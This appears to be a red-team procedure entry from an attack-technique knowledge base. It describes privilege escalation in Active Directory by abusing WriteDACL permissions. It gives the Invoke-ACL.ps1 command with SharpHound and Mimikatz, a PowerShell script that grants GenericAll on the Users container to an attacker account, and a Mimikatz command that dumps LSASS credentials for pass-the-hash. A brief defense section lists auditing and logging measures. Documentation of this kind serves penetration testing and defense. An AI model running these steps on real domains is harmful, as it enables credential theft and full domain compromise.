---
id: b41695a3-a0f8-45cd-b021-32e5b1ca63f6
name: Abuse-Active-Directory-ACLs-Using-WriteDACL-and-Invoke-ACL-Tool
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:06.830760+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Privilege Escalation]]'
  - '[[Lateral Movement]]'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
  - '[[Windows File and Directory Permissions Modification]]'
sub_techniques: []
tags:
  - active-directory
  - acl-abuse
  - privilege-escalation
  - writedacl
commands:
  - '[[commands/invoke-acl-powershell-script]]'
platforms:
  - Windows
  - Active Directory
tools:
  - '[[tools/SharpHound]]'
  - '[[tools/Mimikatz]]'
validated: true
---

# Abuse-Active-Directory-ACLs-Using-WriteDACL-and-Invoke-ACL-Tool

## Summary

This procedure demonstrates how to abuse misconfigured Access Control Lists (ACLs) and Access Control Entries (ACEs) in Active Directory (AD) to escalate privileges. It involves using the WriteDACL rights to modify object permissions and the Invoke-ACL PowerShell tool to discover weak ACLs, enumerate the environment with SharpHound, and exploit them using Mimikatz for credential extraction and privilege escalation.

## Description

Abusing AD ACLs/ACEs targets overly permissive permissions on AD objects like users, groups, and OUs, allowing attackers to grant themselves rights such as GenericAll or WriteDACL. The WriteDACL right enables modification of the Discretionary Access Control List (DACL) on AD objects, potentially leading to full control. The ACL Discovery and Pwnage Tool (Invoke-ACL.ps1) automates identification of vulnerable configurations by collecting AD data via SharpHound and using Mimikatz to dump and crack credentials for lateral movement or persistence. This is typically performed in a domain-joined environment with initial low-privilege credentials. Success can result in domain admin access, enabling data exfiltration or further compromise. Map to MITRE ATT&CK for privilege escalation via AD permission manipulation.

## Requirements

1. Domain-joined Windows machine with PowerShell execution policy allowing scripts (bypass if needed).
2. Initial authenticated access to the AD domain (e.g., standard user credentials).
3. SharpHound.exe and Mimikatz.exe binaries available on the system.
4. Network access to domain controllers for LDAP queries and modifications.
5. WriteDACL or equivalent rights on target AD objects (discovered via enumeration).

## Defense

- Conduct regular audits of AD ACLs using tools like BloodHound or PowerView to identify and remediate permissive ACEs.
- Enforce least privilege by limiting WriteDACL rights to domain admins only and using protected users groups.
- Enable AD logging (e.g., via Event ID 5136 for directory service changes) and monitor for anomalous permission modifications using SIEM tools.
- Restrict PowerShell execution with Constrained Language Mode and log script blocks via AMSI.
- Use just-in-time administration and privileged access workstations to limit exposure.

## Objectives

1. Identify AD objects with weak or misconfigured ACLs/ACEs.
2. Modify DACLs to grant elevated rights (e.g., full control) to attacker-controlled accounts.
3. Escalate privileges by extracting credentials or achieving domain admin access.
4. Enable lateral movement within the AD environment.

## Instructions

### Step 1: Discover Vulnerable AD ACLs

**Context**: Use enumeration to identify AD objects with permissive ACLs, such as those allowing WriteDACL to low-privilege users. This step prepares for modification by pinpointing targets like OUs or service accounts.

Prepare SharpHound and Mimikatz locations on your system. Then execute the Invoke-ACL script to automate discovery.

**Command** ([[commands/invoke-acl-powershell-script]]):
```powershell
./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimikatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'
```

> This command runs the script, which uses SharpHound to collect AD data (including ACLs) and Mimikatz to identify exploitable credentials. Replace placeholders with actual paths, credentials, and domain. Expected output includes a report of vulnerable objects and any extracted hashes or tickets.

### Step 2: Modify DACL Using WriteDACL Rights

**Context**: Once a vulnerable object is identified (e.g., an OU with WriteDACL granted to your user), modify its DACL to grant full control to an attacker account. This can be done via PowerShell Set-Acl or dsacls for AD objects.

Use dsacls (if available) or PowerShell to apply the change. For example, grant GenericAll rights:

```powershell
$objectDN = "CN=Users,DC=domain,DC=local"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount("attacker\user1"), "GenericAll", "Allow", [System.Guid]"00000000-0000-0000-0000-000000000000", "All")
$acl = Get-Acl -Path "AD:$objectDN"
$acl.AddAccessRule($ace)
Set-Acl -Path "AD:$objectDN" -AclObject $acl
```

> Verify the change with Get-Acl. Success grants the specified rights, allowing further abuse like adding users to admin groups.

### Step 3: Exploit Modified ACLs for Escalation

**Context**: With modified permissions, use the elevated rights to dump credentials or add backdoors. Re-run the Invoke-ACL script if needed to exploit newly created weaknesses.

Leverage Mimikatz directly via the tool's output or manually:

```powershell
mimikatz.exe "sekurlsa::logonpasswords" exit
```

> Expected output: Plaintext credentials or hashes from LSASS. Use these for pass-the-hash or further escalation.
